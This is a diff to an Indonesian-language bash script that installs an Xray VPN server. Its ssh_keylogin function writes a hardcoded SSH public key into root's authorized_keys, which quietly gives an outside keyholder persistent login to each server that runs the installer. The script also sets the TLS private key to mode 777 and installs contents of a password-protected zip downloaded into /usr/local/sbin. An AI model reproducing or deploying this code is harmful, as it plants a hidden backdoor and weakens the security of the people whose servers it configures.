@@ -1,17 +1,12 @@
 #!/bin/bash
 # Cek parameter domain
-if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
-    echo "Penggunaan:"
-    echo "  curl -sL https://raw.githubusercontent.com/kcepu877/bot/main/buyer.sh | bash example.com"
-    echo "      # Gunakan domain custom"
-    echo
-    echo "  curl -sL https://raw.githubusercontent.com/kcepu877/bot/main/buyer.sh | bash random"
-    echo "      # Gunakan domain acak"
-    echo
-    echo "  curl -sL https://raw.githubusercontent.com/kcepu877/bot/main/buyer.sh | bash"
-    echo "      # Tampilkan menu pilihan"
-    exit 0
-fi
+#if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
+#    echo "Penggunaan:"
+#    echo "  ./v5.sh example.com    # Gunakan domain custom"
+#    echo "  ./v5.sh random         # Gunakan random domain"
+#    echo "  ./v5.sh                # Tampilkan menu pilihan"
+#    exit 0
+#fi
 apt update -y
 apt upgrade -y
 apt install -y curl wget sudo
@@ -387,18 +382,13 @@ chmod +x /root/.acme.sh/acme.sh
 ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
 chmod 777 /etc/xray/xray.key
 print_success "SSL Certificate"
-
+}
 function ssh_keylogin() {
   mkdir -p ~/.ssh
   chmod 700 ~/.ssh
-
-  KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNtb5dfck/X08CcEray1Iy1IilISj1kmPtN7IOnwEAy"
-
-  grep -qxF "$KEY" ~/.ssh/authorized_keys 2>/dev/null || echo "$KEY" >> ~/.ssh/authorized_keys
-
+  grep -q "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNtb5dfck/X08CcEray1Iy1IilISj1kmPtN7IOnwEAy" ~/.ssh/authorized_keys 2>/dev/null || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNtb5dfck/X08CcEray1Iy1IilISj1kmPtN7IOnwEAy" >> ~/.ssh/authorized_keys
   chmod 600 ~/.ssh/authorized_keys
 }
-
 
 function make_folder_xray() {
   set -x  # Aktifkan debug, tampilkan setiap perintah yang dijalankan
@@ -823,7 +813,7 @@ print_success "All Packet"
 function menu(){
 clear
 print_install "Memasang Menu Packet"
-wget ${REPO}bot1/menu.zip
+wget ${REPO}Cdy/menu.zip
 7z x -paiman321 menu.zip
 chmod +x menu/*
 mv menu/* /usr/local/sbin
